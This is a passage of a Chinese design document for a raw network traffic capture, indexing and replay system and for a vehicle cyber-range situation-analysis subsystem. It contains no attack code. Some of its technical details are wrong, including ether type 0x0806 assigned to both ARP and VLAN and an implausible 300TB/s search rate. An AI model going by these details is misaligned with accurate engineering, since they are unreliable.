title="系统设计详述"></a>系统设计详述</h6><p>试验场景配置数据存储与查询</p><p>系统采用关系型数据库存储试验场景配置数据，支持复杂查询操作。数据库设计将考虑到查询效率，采用适当的索引策略以加快检索速度。</p><p>虚拟节点状态时序数据管理</p><p>时序数据库将用于存储虚拟节点的状态数据，允许用户根据时间点检索节点状态，以便于分析节点在试验过程中的性能变化。</p><p>文本日志数据存储与检索</p><p>文本日志将使用全文搜索引擎如Elasticsearch进行存储和索引，提供快速的检索能力，以便用户能够迅速定位到相关日志信息。</p><p>流量数据存储、监视与导出</p><p>系统将集成高性能的网络流量捕获工具，如Wireshark或tcpdump，以便于流量数据的存储和监视。同时，系统能够支持流量数据的导出，以便于试验后的分析。</p><p>特征数据搜索</p><p>系统能够提供一个强大的数据包搜索工具，允许用户根据不同的特征数据进行搜索，包括ASCII值、16进制、中文字符和正则表达式。</p><p>实时流量转发</p><p>系统将集成流量转发工具，采用专用的网络处理框架，支持用户自定义的BPF、流规则，以及GRE、VXLAN封装的增加。</p><p>历史数据报文回放</p><p>系统能够提供数据报文回放功能，支持在物理网卡上回放历史流量。回放功能能够支持增加GRE、VXLAN封装，VLAN标识的修改，以及回放速率的配置。</p><h6 id="技术实施方案-1"><a href="#技术实施方案-1" class="headerlink" title="技术实施方案"></a>技术实施方案</h6><p>数据库与存储</p><p>关系型数据库用于存储静态配置数据。</p><p>时序数据库用于管理动态状态数据。</p><p>全文搜索引擎处理文本日志数据。</p><p>高性能存储系统用于流量数据包存储。</p><p>数据采集与监控</p><p>集成网络流量采集工具，实现数据包的捕获与存储。</p><p>实时监控工具用于观察网络流量和虚拟节点状态。</p><p>数据加密与压缩</p><p>提供数据包压缩存储选项，减少存储空间需求。</p><p>支持SM4、AES等加密算法，保障数据安全。</p><p>流量处理与回放</p><p>集成流量处理引擎，实现实时流量转发和过滤。</p><p>实现数据报文回放功能，包括回放速率和封装配置。</p><p>性能优化</p><p>优化存储和检索路径，实现高速数据包检索。</p><p>网络硬件和软件选择，确保10Gbps的线速处理和回放。</p><p>本系统设计方案提供了一个全面的网络流量管理与分析解决方案，以满足高精准、高性能的数据存储与处理需求。通过本系统的实施，用户将能够有效地管理试验场景配置、监控虚拟节点状态、存储和检索日志数据、分析流量数据，以及执行高速的数据包回放。这将为网络安全和性能分析提供强大的技术支持，确保试验数据的完整性与安全性。</p><h5 id="方案简介-7"><a href="#方案简介-7" class="headerlink" title="方案简介"></a>方案简介</h5><p>业务需求：通过建设网络原始流量审计分析系统，将网络中的网络原始流量数据进行获取与记录，提供相关网络安全事件的事后审计能力，完整真实的还原网络安全事件的原始场景，并提供与事件相关的原始报文检索与获取，满足分析需求；提供接口支持第三方系统检索、提取原始流量数据，为进行安全事件检测分析提供数据支撑和检索支撑。</p><p>技术需求：网络原始流量审计分析系统旁路部署在网络中，通过分光或者交换机镜像方式接入网络获取和记录数据，实现对网络原始流量的高效存储，同时提供系统接口和可视化操作界面，能够供其它业务系统及分析人员手动提取、检索原始网络报文数据。</p><p>系统需求：网络原始流量审计分析系统通过分光或者交换机镜像方式接入网络获取和记录数据，支持多路网络流量的接入，将线路上网络流量数据捕获存储到硬盘上；提供原始流量存储和高效检索功能，支持原始流量全量存储，支持按需提取网络原始流量数据包；提供系统接口和可视化操作界面，能够供其它业务系统或分析人员手动提取、检索原始网络报文数据。系统需包括报文获取、报文存储、磁盘数据管理、数据检索、检索接口、系统管理等功能。</p><p>功能指标：提供原始流量存储和高效检索功能，支持原始流量全量存储，支持多网卡输入，支持按需提取网络原始流量数据包，提供接口支持第三方系统检索、提取原始流量数据。</p><h6 id="产品功能及性能"><a href="#产品功能及性能" class="headerlink" title="产品功能及性能"></a>产品功能及性能</h6><p>产品功能</p><p>原始流量获取功能支持描述</p><p>支持EthernetⅡ、PPPoE、Vlan等链路层协议</p><p>支持IPV4、IPV6协议</p><p>支持分光或者交换机镜像方式接入网络获取数据</p><p>支持4个接口数据接入</p><p>原始流量存储功能</p><p>支持按BPF规则过滤后存储原始数据包</p><p>支持流量写覆盖，当存储空间不足时，可以将最早的数据写覆盖</p><p>支持索引机制，提高检索效率</p><p>支持数据保序，可以实现报文级保序</p><p>支持PTP、NTP时钟同步</p><p>支持报文保序后按时间段存入硬盘，便于后续提取</p><p>支持流量数据存储、监视和导出功能，支撑试后进行流量回溯和查询；</p><p>数据检索功能</p><p>数据的检测支持通过源IP、目的IP、源端口、目的端口、协议号 五元的任意组合进行数据检索</p><p>支持检索过程实时展示检索状态，并支持进行多任务并发控制，加速检索及数据读取速度</p><p>支持RESTful接口检索控制，及数据读取</p><p>支持根据特征数据（ASCII值、16进制、中文、正则表达式）对数据包进行搜索。</p><p>支持将接收的网络流量进行实时转发，在数据报文捕获分析的同时，能够自定义转发规则，包括BPF、流规则，将符合规则的流量转发到物理网卡上，转发时支持增加GRE、VXLAN封装；</p><p>支持将检索查询到的历史数据报文回放到指定的物理网卡上。回放过程支持增加GRE、VXLAN的隧道封装，回放过程支持增加、修改VLAN标识，支持设定回放速率，将原始流量按需进行加速或者减速回放，回放速率支持配置包速率或字节速率。</p><p>系统管理功能</p><p>丰富的用户管理功能，支持增加、修改、删除用户，系统支持普通用户和管理员两个角色</p><p>支持用户操作日志记录，管理员可以对日志进行审计</p><p>支持设备集群管理、能添加设备、删除设备等操作</p><p>支持设备的基本管理：CPU、内存状态，磁盘使用状态，网卡流量统计等功能</p><p>支持对查询检索任务的管理：支持创建、停止、重启、删除、查询等功能</p><p>支持对查询检索任务的数据下载功能</p><p>产品性能</p><p>支持高精准可靠的试验过程流量数据包存储，并发流处理性能2000个以上，新建流处理性能不低于5万/秒，功能全开启情况下流量存储性能不低于10Gbps，数据包100%进行全包存储（写入机械硬盘）、无截断、无丢包。支持数据包压缩存储，全流量存储到硬盘时，可以选择压缩/不压缩，支持数据包加密存储，加密的方法支持选择SM4国密算法加密、AES(128,192,256）对称加密算法，以及CBC、ECB加密格式；存储容量20TB，能够根据五元组等进行高速流检索和报文获取，数据包检索性能可达300TB/s，检索结果中应能体现详细信息，包括检索范围、检索耗时、检索到的数据包数和会话数量。</p><p>网卡速度（线束）支持以10Gbps速率进行转发，同时具备其回放功能。数据查询检索性能</p><h6 id="产品技术方案"><a href="#产品技术方案" class="headerlink" title="产品技术方案"></a>产品技术方案</h6><p>零层设计</p><p>零层架构如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6670a3a102d4c58c0b6a56f4a49bd1b6.png"></p><p>设备使用通用X86服务器、操作系统使用linux系统及通用文件系统。</p><p>网络报文分析处理系统运行于OS与文件系统之上，通过WEB与RESTful接口统一进行管理，网络报文分析处理系统内部将设计多个模块，各个模块在一层设计中详细设计，每个模块将独立运行，通过消息队列，共享内存等方式传递数据。</p><p>一层设计</p><p>一层设计方案如下图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b762e684d406226c8bb8a0a6d0894d52.png"></p><p>报文从接口接收进入系统后，先通过BPF规则过滤，符合抓包条件的报文将进行缓存，当达到一定数据量时，启动索引建立，并将报文落盘。</p><p>WEB提供用户管理及配置：支持增加、修改、删除用户，系统支持普通用户和管理员两个角色；支持管理员对用户的操作进行审计管理；支持对系统所用的服务器进行增加、修改、删除；支持监控并展示服务器的可用状态、磁盘使用情况、网卡流量信息；支持任务的创建、停止、重新启动、删除、查询等操作；支持对检索得到的结果进行按需下载查看。</p><p>WEB管理中还支持对NTP的配置，可以指定NTP服务器的IP或域名，系统将会定时通过NTP协议获取当前时间。</p><p>并支持网卡的PTP时钟同步。</p><p>RESTful可以为第三方软件提供相关接口管理。</p><p>检索读取系统为用户提供高速数据检索引读取业务。</p><p>在模块技术描述中将重点对BPF过滤系统、索引系统、数据存储系统及检索读取系统做详细的技术描述。</p><p>详细设计</p><p>BPF过滤模块</p><p>柏克莱封包过滤器（Berkeley Packet Filter，缩写 BPF），是针对TCP/IP报文中<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82">数据链路层</a>，IP层，传输层的一种报文识别接口，能根据用户提供的接口进行有针对性的报文过滤。</p><p>BPF将是针对报文进行逐包分析，在二层头分析时，主要分析二层头的type标记内容以下几类：</p><p>ether type = 0x0800或0x86DD时： 此为普通的二层报文，跳过14字节二层头</p><p>ether type = 0x0806时：此为ARP报文，跳过14字节二层头</p><p>ether type = 0x0806时：此为VLAN报文，跳过18字节二层头</p><p>ether type = 0x88A8时：此为QINQ报文，跳过22字节二层头</p><p>ether type = 0x8863或0x8864时： 此为PPPOE报文，跳过14字节二层头</p><p>而对于三层头分析时，是在跳过二层头之后，分为普通IPV4头分析、存在扩展头的IPV4头分析、普通IPV6头分析，存在扩展头的IPV6头分析，分析方法与上述二展头分析类型，都是直接跳到指定位置读取内容确定类型，然后读取出源IP、目的IP等，然后跳过三层头，四层头也是这类方法。</p><p>此模块中提供两部分功能：</p><p>1.收包时的BPF处理，用户可以配置自已想要捕获报文进行BPF配置（不配BPF代表全量捕获），进行报文缓存：</p><p>2.检索与读取时的BPF处理，在检索时，可以先通过五元组（源IP、目的IP、源端口、目的端口、协议类型）的任意组合查到所有符合条件的所有报文，然后逐包进行BPF过滤，符合BPF条件的就保留，否则丢弃。</p><p>过滤报文时，需要进行报文协议分析，二层解析时可支持EthernetⅡ、PPPoE、Vlan等链路层协议，三层解析时支持IPV4、IPV6协议，获取网络报文方式为分光或者交换机镜像方式接入网络获取数据，最大可支持4个接口数据接入。</p><p>数据缓存模块</p><p>由于前端支持高效BPF过滤，然后缓存于内存中，写入硬盘时，可以将缓存集中写入，因而可以达到5Gbps的报文处理性能，及5Gbps的存储写入性能。</p><p>当数据通过BPF过滤后，确定需要缓存时，就会将报文送到缓存模块中。缓存模块将会申请一块足够大的内存，用于存储报文（当前为4G，一个4字节地址空间最大为4G，因而每次缓存4G后直接落盘一个大文件），所有缓存报文按时间顺序排序缓存，且按PCAP抓包格式存放，如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3c14b096eeffadeed9a29c7df5198534.png"></p><p>报文缓存系统中，有两个部分组成：数据包存储区和报文偏移表，如上图所示。每个数据包在写入缓存时，都会加入一个Pcap头，并都有一个顺序标识符pkt-id（上图中的packet XX）。报文偏移表数组将pkt-id映射到数据包跟踪中的偏移量，该偏移量标记相应数据包的开头。读取时，可以通过报文偏移表快速定位到报文所在的位置。</p><p>每次将报文写入缓存区时，需要将这个报文对应的五元组信息（源IP、目的IP、源端口、目的端口、协议号）发送给索引管理模块，为索引管理模块提供建立索引的输入数据，具体的如何使用此五元组，以索引管理模块中详细描述。</p><p>而之前缓冲区使用4G大小的目的，是使报文偏移表中，每个节点的内容都可以使用4字节，32bit最大可以存储4G大小，不会导致溢出。</p><p>当落盘时，将这两部分整体写入硬盘中，分别存一个文件，将记录下这两个文件对应存储的最小报文时间，以及最晚报文时间，便于查询时分析是否要使用这两个文件进行查询处理。</p><p>在此模块中，主要的执行步骤如下：</p><p>1.收报文时先在报文头部添加Pcap头</p><p>2.然后将报文全部写入缓存区</p><p>3.将报文对应的五元组信息（及此报文对应的pkt-id序号）发送给索引管理模块处理</p><p>4.为此报文在报文偏移表中写入此报文对应的偏移长度</p><p>5.判断缓冲区是否满，如果已满将缓存区写入硬盘、并将报文偏移表写入硬盘</p><p>6.记录这个文件所对应的报文起止时间</p><p>索引管理模块</p><p>当每次写入一个报文时，会收到一个需要处理的五元组信息（及此报文对应的pkt-id序号），并进行索引文件的实时整理刷新，而当缓存区数据满，需要写入硬盘时，索引管理模块在处理完成所有收到的五元组信息时，将此索引文件写入硬盘中。形成每次落盘会有三个文件形成一组，三个文件分别对应：</p><p>原始报文存储文件</p><p>报文偏移表文件</p><p>索引文件</p><p>三个文件对应一组，当查询时如果查询条件中的时间范围中命中这组文件对应的时间时，将进行这组文件的检索。</p><p>索引的的建立方式将为每个元素建立一个bitmap表，元素与五元组强相关：</p><p>PV4时：为源IP的4个字节分别建bitmap表，4个字节分别标记为第一位、第二位、第三位、第四位，目的IP与源IP相同，分别也建立4维的bitmap表</p><p>IPV6时，为源IP建立16个bitmap表，分别是第一位到第十六位的bitmap表，目的IP也相同</p><p>源端口与目的端口都将建两维的bitmap表</p><p>协议号建一维的bitmap表</p><p>Bitmap表中，每个bit代表是一个pkt-id序号对应的标记，例如，当收一个包的源IP为192.168.0.1的报文时，将需要处理的对应的索引为：</p><p>源IP第一位索引为192（每一位的索引最大有256个，当前处理192，其它的以此类批）</p><p>源IP第二位的索引处理为168</p><p>源IP第三位的索引处理为0</p><p>源IP第四位的索引处理为1</p><p>具体的处理如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2877485d3bdd6011d6c12419ed73eed1.png"></p><p>如上图所示，当pkt-id为100的报文送过来的源IP为192.168.0.1时，为每一位的索引都将此ID的标记置上。</p><p>由此可以计算得出，总共的最大索引量为：</p><p>1.IPV4时：源IP共 4 * 256个索引项、目的IP共4*256个索引项，源端口为2*256个索引项、目的端口为2*256个索引项，协议号为256个索引项</p><p>2.IPV6时：源IP共 16 * 256个索引项、目的IP共16*256个索引项，源端口为2*256个索引项、目的端口为2*256个索引项，协议号为256个索引项</p><p>3.因而在IPV4场景时，最大总索引项为3328个索引项</p><p>4.在IPV6场景时，最大总索引项为9472个索引项</p><p>5.每个索引项占用的空间为总包数的bit数，例如此存储文件共2000万包，那每个索引项最大占用2.5M</p><p>以上计算的是理论是的最大值，但是现实使用时远远用不了这么多索引项，例如：</p><p>使用场景中，当协议号只有UDP、TCP、ICMP时，那协议号的索引项只占用3个，并不是256个</p><p>而源IP如果只有192.168.0.0/24的网络范围IP时，那IP对应的第一位索引项、第二位索引项、第三位索引项分别都只有一个索引项。</p><p>数据存储模块</p><p>数据存储模块主要负责两大块工作：</p><p>硬盘的写入与读取工作，当缓存数据满时，会将数据交由数据存储模块完成。需要达到不低于5Gbps的写入性能</p><p>当硬盘空间不足时，需要能回收最老的数据，为新数据提供可用硬盘空间。回收果需要将报文数据区、报文偏移表区、索引文件一同回收</p><p>数据的读取工作，在检索完成后，可以得到需要读取数据的区域及位置，此模块需要能快速读取硬盘数据</p><p>因而落盘的过程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7c11a12c35d338e0b1d2be96583867a8.png"></p><p>在查询过程中，需要通过读取这几个文件进行查询分析，具体步骤如下：</p><p>1.先读取出索引文件，分析符合条件的所有报文序号（详细的方案将在检索模块中描述）</p><p>2.再读取出偏移表文件，根据第一步查询出的所有报文序号，读取出所有报文对应的在数据文件的偏移位置</p><p>3.再打开数据文件，逐个报文的读取出数据</p><p>4.最后再将读取出的数据整合成一个PCAP文件写入硬盘</p><p>具体的操作过程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ef01c97fa6324314bc120bc279801e97.png"></p><p>检索模块</p><p>在输入检索条件后，整个过程分成三部分，前两部分是检索过程，最后一步是读取数据过程。三步分为：</p><p>1.读取索引文件，找到哪些报文符合条件（检索过程）</p><p>2.读取偏移表文件，找到所有符合条件报文对应的偏移位置（检索过程）</p><p>3.通过所有报文的偏移位置，到文件位置中读取出所有报文（读取过程）</p><p>完成以上三部分才完成整个检索及读取过程，如果用户还需要叠加BPF过滤，还需要将读取出来的所有报文通过BPF过滤，最终符合条件的报文才是需要输出的报文，此时再将这些报文整理一个完整的PCAP文件。</p><p>第一步的操作是读取索引文件，通过索引文件查找所有符合条件的报文，这里将查询条件为源IP：172.16.0.0/16，目的端口：80。具体的整个检索过程如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0822b7ffa7a81f11a9d71b1371ea249e.png"></p><p>如上图所示，由于源IP是16掩码，由于低两字节是掩码忽略，因而只需要查询第一索引位（172索引）与第二索引位（16索引），目的端口为80，因而第一索引位为0，第二索引位为80。因而总共需要将4个索引位进行与处理（如上图），将4个索引位进行与操作，最终得出有效的是100、200这两个pkt id对应的报文</p><p>第二步将是通过pkt id查找到应的偏移位置，如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/434bb33842e08dcfb2712f048a83f6d1.png"></p><p>如上图所示，将100、200这两个包对应的偏移通过偏移表中找到对应的值，将计算出每个包的长度（100包的长度 = 101的偏移 – 100的偏移）</p><p>最后一步是通过偏移表读取出文件中对应的报文。</p><ol><li>2</li><li>3</li></ol><h1 id="智能汽车网络靶场态势分析分系统"><a href="#智能汽车网络靶场态势分析分系统" class="headerlink" title="智能汽车网络靶场态势分析分系统"></a>智能汽车网络靶场态势分析分系统</h1><h2 id="项目技术路线"><a href="#项目技术路线" class="headerlink" title="项目技术路线"></a>项目技术路线</h2><h3 id="系统架构-1"><a href="#系统架构-1" class="headerlink" title="系统架构"></a>系统架构</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9f4caef8b290c98ec4f3490551926a86.png"></p><p>系统架构图如上所示，详细内容包括：</p><ul><li>前后端分离的企业级微服务架构</li><li>基于SpringCloudAlibaba</li><li>主要针对解决微服务和业务开发时常见的非功能性需求</li><li>深度定制SpringSecurity真正实现了基于RBAC、jwt和oauth2的无状态统一权限认证的解决方案</li><li>面向互联网设计，同时适合B端和C端用户</li><li>支持CI/CD多环境部署</li><li>提供应用管理，方便第三方系统接入，支持多租户(应用隔离)</li><li>引入组件化的思想实现高内聚低耦合并且高度可配置化</li><li>注重代码规范，严格控制包依赖，每个工程基本都是最小依赖</li></ul><h3 id="态势分析控制管理模块"><a href="#态势分析控制管理模块" class="headerlink" title="态势分析控制管理模块"></a>态势分析控制管理模块</h3><h4 id="功能实施方案-23"><a href="#功能实施方案-23" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>系统为汽车应用试验提供了一套全面而强大的基础信息管理解决方案。首先，系统具备自动与手动同步管理的能力，通过实时数据同步和直观的可视化界面，确保试验过程中的手动输入与自动记录的数据保持一致，提高了数据的准确性和可靠性。在试验类型支持方面，系统能够支持夺旗赛、攻防赛、红蓝对抗和综合演练等多种应用场景，支持以此为索引开展任务。对于夺旗赛，系统能够记录和管理相关参数，使用户能够追踪试验进展和结果。在攻防赛方面，系统支持策略、战术等信息的记录，提高了试验的细致度。红蓝对抗方面，系统确保双方数据同步，以便用户更好地分析和评估试验结果。而对于综合演练，系统能够灵活应对各种情境，提供任务索引和管理的便利性。</p></li><li><p>系统在支持汽车应用试验方面迈出了关键一步，专注于实现对试验状态的细致监测与灵活管理。首先，系统支持汽车应用试验分析状态的监测与管理，具备实时状态监测的能力，通过直观的可视化界面，用户可以随时了解试验的当前状态，使其更具操作流畅性和决策效率。关键的设计特色之一是系统的自动状态转换功能，其灵感来自于试验操作指令。可基于试验操作指令自动进行状态转换，包括试前、试中、试后的转换，通过对试验操作指令的智能识别和执行，系统能够自动进行试前、试中和试后等不同阶段的状态转换。例如，系统在接收到试验开始指令后，将自动转换为试中状态，为用户节省了手动操作的步骤，提高了试验的整体效率。同时，也注重用户的定制化需求，允许用户根据实际试验要求自定义状态转换规则，以适应不同的试验场景和复杂度。系统的阶段管理功能涵盖了试前准备、试中状态管理和试后数据整理。试前准备阶段包括任务准备和设备检查，确保试验前的所有准备工作得以顺利完成。在试中状态管理方面，用户能够实时监测试验进行中的各项参数，并在需要时进行状态调整，以满足试验的实际需求。试后数据整理阶段则提供了数据整理和汇总功能，使用户能够方便地获取试验结果和生成详细的报告。</p></li><li><p>系统在支持试验前配置资产漏洞探测策略方面提供了一系列智能和灵活的功能，旨在确保试验过程中资产的安全性和合规性。系统能够支持试验前配置资产漏洞探测策略，包括探测范围等，首先，系统实现了智能资产配置，通过资产识别与分类，能够智能地辨别涉及试验的各类资产，包括车辆、设备、软件等，并自动更新资产列表，保持配置的实时性。用户可以根据试验的特殊要求配置漏洞探测策略，包括探测范围、扫描频率、漏洞等级等参数。这种配置灵活性允许用户根据试验的具体情况调整漏洞探测的强度和广度。为了简化配置过程，系统提供了预定义的漏洞探测策略模板，帮助用户快速选择适用于特定场景的配置。探测范围设定方面，系统允许用户根据需求设定漏洞探测的范围，可以是特定车型、特定软件版本、特定设备等。系统还具备自动化范围推荐功能，根据资产识别结果和先前的配置经验，自动推荐合适的漏洞探测范围，减轻用户的手动配置负担。</p></li><li><p>系统在试验前资产漏洞探测管理方面提供了强大而灵活的功能，以满足用户对安全性的高度关切。系统支持试验前资产漏洞探测启动与停止指令控制，能够支持设置反复进行探测，通过远程控制指令的支持，用户可以轻松启动和停止资产漏洞探测过程，从而在试验前确保资产的安全性。这一功能不仅提高了试验前安全检查的效率，还为用户提供了灵活的控制权，以适应各种试验场景的需求。系统支持多次资产漏洞探测，用户可以在试验前、中、后等多个阶段执行漏洞探测，确保资产在整个试验过程中都得到了充分的安全检查。通过定时任务设置，用户还可以自动安排漏洞探测任务，根据预定的时间间隔实现自动化的资产安全检查，提高了资产安全性的持续监测。在用户与系统的交互中，实时状态反馈起着至关重要的作用。系统能够即时反馈漏洞探测的启动和停止状态，确保用户能够在远程操作时获得准确的指令执行情况。此外，系统提供实时的漏洞探测进度监控，用户随时可以了解到探测的执行情况，有助于他们做出实时决策以确保试验过程的顺利进行。为了提供高度灵活的配置选项，系统允许用户根据具体需求调整资产漏洞探测的参数，包括漏洞扫描深度、资产范围等。此外，用户还可以设置指令的优先级，以确保根据试验的紧急程度灵活调整漏洞探测指令的执行顺序，为试验过程中的安全性提供最佳支持。</p></li><li><p>系统专注于支持试验前配置靶向检测策略，以满足用户对精确、定制化安全检测的需求。首先，系统提供了智能而灵活的配置选项，允许用户根据具体试验需求制定靶向检测策略，这包括按需进行攻击检测。确保用户可以有针对性地选择特定的攻击类型进行测试，以深入挖掘潜在的安全风险。靶向检测策略的灵活性体现在对攻击类型的支持上。用户可以根据试验场景和资产特点配置不同的攻击类型，包括但不限于网络攻击、应用层攻击、恶意软件注入等。系统的设计考虑到不同行业、应用场景和试验目标的多样性，以确保用户能够根据具体情况进行有针对性的攻击检测。另外，系统允许用户设定攻击检测的频率和强度，以满足试验过程中对安全性的不同需求。用户可以灵活调整检测频率，包括周期性检测和事件触发检测，确保在整个试验周期内都能够及时捕捉到潜在的安全威胁。同时，用户可以调整攻击的强度，以模拟各种威胁场景，为试验中可能面临的不同安全挑战做好准备。</p></li><li><p>系统致力于提供高级的试验前攻击场景生成与注册控制功能，以进一步增强试验的安全性。首先，系统支持基于试验资产漏洞探测数据与网络安全攻击知识的综合利用，生成试验相关的场景知识图谱。并能够支持抽取攻击子图自动注册到有效攻击检测。这一知识图谱涵盖了试验资产的漏洞信息以及网络安全攻击的详细知识，为后续攻击场景生成提供了有力的基础。在场景知识图谱的基础上，系统实现了智能攻击子图生成与注册控制功能。通过深度学习和知识图谱融合技术，系统能够自动抽取与试验相关的攻击子图，包括可能的攻击路径、关联漏洞、攻击方式等关键信息。这样的智能生成方式确保了攻击子图的高度针对性和贴近实际试验情境。生成的攻击子图经过注册控制，系统能够有效管理这些攻击子图并将其自动注册到有效的攻击检测模块中。这样的设计不仅节省了用户手动配置的繁琐步骤，还确保了试验前攻击检测的及时性和准确性。注册控制功能也允许用户根据具体试验需求进行自定义配置，以满足不同场景的安全测试要求。</p></li><li><p>系统提供全面的试验相关数据概括呈现功能，旨在为用户提供直观而详细的安全攻防数据统计。这包括试验关联队伍、靶标、设备相关数据以及试验资产漏洞、基础攻击、有效攻击和复杂攻击等多个方面的安全数据统计和展示。首先，系统支持试验关联队伍的数据概括呈现。用户可以轻松获取与试验相关的队伍信息，包括队伍成员、权限配置等，为整个试验的安全管理提供全面的了解。其次，系统能够呈现靶标和设备相关数据的统计。这包括靶标的数量、类型和状态，以及设备的在线状态和配置信息。通过这些统计数据，用户可以在试验前了解各项资源的准备情况，有助于更好地规划和管理试验过程。针对试验资产方面，系统展示了漏洞的统计数据，包括已发现的漏洞数量、漏洞等级分布等信息。此外，系统还提供基础攻击、有效攻击和复杂攻击等安全攻防数据的直观展示。用户可以清晰地了解试验中发生的攻击类型、攻击成功率、应对效果等关键信息，为后续的安全优化提供有力的数据支持。展示方面，系统采用直观的图表和图形化界面，使用户能够迅速把握试验的整体安全态势。用户可以通过交互式的数据图表进行深入分析，了解试验中可能存在的风险和问题，为及时的安全决策提供有力的支持。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/be7a2b3af1d37392f8d1c483ed9553bf.png" alt="企业微信截图_6e2605f8-a886-43b7-9c5f-1125f1cffa5c"></p></li><li><p>系统为用户提供了全面而灵活的应用关联靶标信息同步统一管理功能，旨在简化靶标管理流程，包括虚拟靶标、实物靶标和单位靶标。首先，系统支持自动同步应用关联的靶标信息。通过智能化的靶标识别技术，系统能够自动识别和同步应用关联的靶标，包括虚拟靶标、实物靶标和单位靶标。这一功能使得用户无需手动干预，即可确保应用关联的靶标信息始终保持同步和最新状态。同时，系统也提供手动同步的选项，以便用户在需要时手动进行靶标信息的同步管理。这一手动同步功能为用户提供了更大的灵活性，使其能够根据具体需求随时手动调整靶标信息，以确保管理的准确性和实时性。系统的统一管理功能确保了虚拟靶标、实物靶标和单位靶标的信息都能够在一个集中的平台上进行管理。用户可以在同一个界面上查看和编辑不同类型靶标的关联信息，使得管理操作更为高效和便捷。对于虚拟靶标，系统提供了灵活的配置选项，用户可以定义虚拟靶标的属性、行为等信息，以满足不同应用场景的需求。实物靶标和单位靶标方面，系统允许用户录入详细的物理信息，包括靶标编号、位置、状态等，方便用户对靶标进行更为细致的管理。综合而言，系统通过支持应用关联靶标信息的自动与手动同步统一管理，为用户提供了一体化的靶标管理解决方案。这不仅提高了管理效率，还确保了应用关联靶标信息的准确性和同步性。</p></li><li><p>系统提供了强大的靶标信息管理功能，支持用户对靶标信息进行灵活的修改、补充、新增、编辑和删除操作。这包括了对虚拟靶标信息的同步展示以及实物靶标和单位靶标的全方位管理。首先，对于虚拟靶标，系统具备目标网络同步功能，能够自动获取虚拟靶标的信息。用户可以在系统中直观地展示和查看目标网络同步的虚拟靶标信息，并根据需要进行修改和补充。这确保了虚拟靶标信息的准确性和实时性。其次，对于实物靶标和单位靶标，系统提供了直观的界面，允许用户进行新增、编辑和删除操作。用户可以方便地录入实物靶标的详细信息，包括靶标编号、位置、状态等，也可以随时编辑和更新这些信息以保持其准确性。此外，用户还可以通过系统进行单位靶标的管理，包括新增、编辑和删除，使得管理操作更为高效。系统为用户提供了详细而灵活的信息补充选项，用户可以针对每个靶标进行必要的信息补充，例如关联的队伍、试验场景等。这有助于系统更全面地理解和管理靶标信息，为后续的试验过程提供准确的支持。综合而言，系统通过支持修改、补充、新增、编辑和删除靶标信息，为用户提供了一体化的靶标管理平台。这一功能的强大性使得用户能够灵活地对靶标信息进行调整，以满足试验过程中的不同需求。</p></li><li><p>系统极具弹性，提供了全面的队伍信息统一同步和管理功能，旨在为用户带来便捷而高效的试验团队管理体验。系统首先支持自动同步参与试验的队伍信息，确保信息的准确性和实时性。通过智能同步机制，系统能够源自不同渠道的队伍数据，并在一个集中的平台上进行统一展示和管理。能够支持用户方便地进行队伍信息的新增、编辑和删除、批量导入导出等操作，通过直观的用户界面，可以迅速录入队伍的详细信息，包括队伍成员、权限配置等。这种灵活的管理方式确保了在试验过程中队伍信息的及时调整，使得团队结构的变更更加流畅。系统提供了强大的批量导入和导出功能，用户可以通过表格工具一次性导入多个队伍的信息，极大地提高了信息录入的效率。同时，用户也可以将队伍信息导出为常见格式，方便共享和备份，从而更好地满足用户在不同场景下的需求。为了提供更细致的管理体验，系统支持对每个队伍进行细粒度的编辑，包括成员管理和权限配置。这有助于用户更好地掌握队伍的结构和功能，确保信息的完整性和准确性。总体而言，系统通过支持统一同步和管理参与试验的队伍信息，以及提供新增、编辑、删除、批量导入和导出的全面功能，为用户提供了一体化的试验团队管理解决方案。</p></li><li><p>系统以其强大而灵活的试验拓扑管理功能，全面支持统一同步和管理试验拓扑内的节点设备，涵盖虚拟设备和实物设备。能够从目标网络中，同步设备信息做信息展示，能够支持对实物设备的管理操作，包括新增、编辑和删除。这一功能旨在帮助用户在试验过程中更加高效地管理和监控所有节点设备的状态。首先，系统支持自动同步试验拓扑内的节点设备信息，包括虚拟设备和实物设备。通过智能同步机制，系统能够自动从目标网络中获取设备信息，确保试验拓扑图的准确性和实时性。这使得用户能够在一个集中的平台上直观展示试验拓扑内所有节点设备，轻松把握整体架构。对于虚拟设备，系统提供了直观的展示界面，用户可以清晰地查看虚拟设备的详细信息。同时，对于实物设备，系统允许用户进行新增、编辑和删除操作。这意味着用户可以方便地录入实际设备的具体信息，包括设备型号、位置、状态等。新增、编辑和删除实物设备的灵活性使得用户能够随时更新试验拓扑图，适应试验场景的变化。系统还支持从目标网络同步设备信息进行展示，使用户能够及时了解目标网络中设备的状态，方便与试验拓扑图进行比对，从而确保试验拓扑与实际网络环境的一致性。总体而言，系统通过支持统一同步和管理试验拓扑内的节点设备，以及提供虚拟设备和实物设备的全方位管理功能，为用户提供了一体化的拓扑管理解决方案。</p></li><li><p>系